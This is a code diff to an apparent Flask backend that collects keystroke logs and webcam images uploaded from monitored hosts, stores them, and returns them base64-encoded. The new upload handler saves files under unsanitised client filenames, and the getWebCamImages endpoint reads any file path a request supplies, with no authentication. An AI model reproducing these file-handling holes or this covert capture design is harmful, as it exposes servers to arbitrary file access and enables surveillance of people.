@@ -2,7 +2,11 @@ from flask import Flask, json, jsonify, request, render_template
 from middleware_db import ConnectDB
 import os.path as path
 import os
-import uuid
+from base64 import b64encode
+from json import dumps
+from PIL import Image
+
+from datetime import datetime
 import ast  # used to convert json object from <unicode> to <dict> type
 app = Flask(__name__)
 connObj = ConnectDB()   # Obtain a DB connection enabled object.
@@ -17,7 +21,7 @@ def homepage():
 @app.route('/api_login', methods=['POST'])
 def login_check():
     login_form_data = ast.literal_eval(json.dumps(request.json, ensure_ascii=False))
-    username = login_form_data['inputUsernae']
+    username = login_form_data['inputUsername']
     password = login_form_data['inputPassword']
     # print username, password
     login_json = {
@@ -225,64 +229,123 @@ def update_key_logs():
     return jsonify(success)
 
 
-# Endpoint for updating webcam capture in database
+# Endpoint for api request and inserting webcam capture in database
 @app.route('/update_webcam_capture/', methods=['POST'])
 def insert_webcam_capture():
+    #  print data_temp
     # For fetching form request(images) sent by host
     file = request.files['media']
-    fname = str(file)
-    file_name = str(uuid.uuid4())
-    # if image folder is not there create one
-    if not path.exists('Webcam_Images\\'):
-        os.makedirs('Webcam_Images\\')
 
-    if not path.exists('Webcam_Images\\' + file_name):
-        if fname.__contains__('.jpeg'):
-            file.save('Webcam_Images\\' + file_name + '.jpeg')
-        elif fname.__contains__('.png'):
-            file.save('Webcam_Images\\' + file_name + '.png')
-        else:
-            file.save('Webcam_Images\\' + file_name + '.png')
+    # use uid_timestamp.png as a file name
+    # if image folder is not there create one
+    if not path.exists('Webcam_Images\\\\'):
+        os.makedirs('Webcam_Images\\\\')
+    file_name = (file.filename).split('.')[0]
+    file_type =(file.filename).split('.')[1]
+    imgurl = 'Webcam_Images\\\\' + file_name+'.'+file_type
+    # print imgurl
+    file.save(imgurl)
+    # add images url to db
+    now = datetime.now()
+    # print now.strftime("%Y-%m-%d %H:%M:%S")
+    data = {"u_id": 1,"image_url":imgurl,"webcam_date_time":now.strftime("%Y-%m-%d %H:%M:%S")}
+    # print data
+    resultSet = connObj.NewInsert('webcam_capture', data)
+    if resultSet == 'error':
+        error = {
+            "message": "Error"
+        }
+        return jsonify(error)
 
     success = {
         "message": "Success"
     }
     return jsonify(success)
 
+# here
+# Endpoint to fetch webcam data and display to user
+@app.route('/getWebCamData/<user_id>', methods = ['GET'])
+def getWebCam(user_id):
+    data = {"u_id":user_id}
+    resultSet = connObj.NewSelect('webcam_capture', data)
+    if resultSet == 'error':
+        error = {
+            "message": "Error."
+        }
+        return jsonify(error)
+
+    resultSetArray = []
+    for record in resultSet:
+        recordJson = {
+            "u_id": record[0],
+            "webcam_date_time": record[1],
+            "image_url": record[5],
+        }
+        resultSetArray.append(recordJson)
+    success = {
+        "message":resultSetArray
+    }
+    # print resultSet
+    return jsonify(success)
+
+# # Endpoint to return image file for webcam url
+@app.route('/getWebCamImages', methods = ['POST'])
+def getWebCamImages():
+
+    data = ast.literal_eval(json.dumps(request.json, ensure_ascii=False))
+    path_file = data['image_url']
+    print path_file
+    with open(path_file, 'rb') as open_file:
+        byte_content = open_file.read()
+
+    # second: base64 encode read data
+    # result: bytes (again)
+    base64_bytes = b64encode(byte_content)
+    # print base64_bytes
+    # now: encoding the data to json
+    json_data = dumps(base64_bytes)
+    # end
+    resultSetArray = []
+    resultSetArray.append(json_data)
+    success = {
+        "message":json_data
+    }
+    # print resultSet
+    return jsonify(success)
 
 # Testing code block
 # Testing SELECT function
-@app.route('/test_select', methods=['POST'])
-def testSelect():
-    data = ast.literal_eval(json.dumps(request.json, ensure_ascii=False))
-    resultSet = connObj.NewSelect('phones', data)
-    print type(resultSet)
-    # resultSet = connObj.NewSelect('phones')
-    if resultSet == 'error':
-        error = {
-            "message": "Unexpected Error Occurred."
-        }
-        return jsonify(error)
-    success = {
-        "message": "Retrieved successfully!",
-        "response_data":resultSet
-    }
-    return jsonify(success)
+# @app.route('/test_select', methods=['POST'])
+# def testSelect():
+#     data = ast.literal_eval(json.dumps(request.json, ensure_ascii=False))
+#     resultSet = connObj.NewSelect('phones', data)
+#     print type(resultSet)
+#     # resultSet = connObj.NewSelect('phones')
+#     if resultSet == 'error':
+#         error = {
+#             "message": "Unexpected Error Occurred."
+#         }
+#         return jsonify(error)
+#     success = {
+#         "message": "Retrieved successfully!",
+#         "response_data":resultSet
+#     }
+#     return jsonify(success)
 
 # Testing INSERT function
-@app.route('/test_insert', methods=['POST'])
-def testInsert():
-    data = ast.literal_eval(json.dumps(request.json, ensure_ascii=False))
-    resultSet = connObj.NewInsert('phones', data)
-    if resultSet == 'error':
-        error = {
-            "message": "Unexpected Error Occurred."
-        }
-        return jsonify(error)
-    success = {
-        "message": "Record inserted successfully!"
-    }
-    return jsonify(success)
+# @app.route('/test_insert', methods=['POST'])
+# def testInsert():
+#     data = ast.literal_eval(json.dumps(request.json, ensure_ascii=False))
+#     resultSet = connObj.NewInsert('phones', data)
+#     if resultSet == 'error':
+#         error = {
+#             "message": "Unexpected Error Occurred."
+#         }
+#         return jsonify(error)
+#     success = {
+#         "message": "Record inserted successfully!"
+#     }
+#     return jsonify(success)
 
 # -- Testing bloack ends --
 
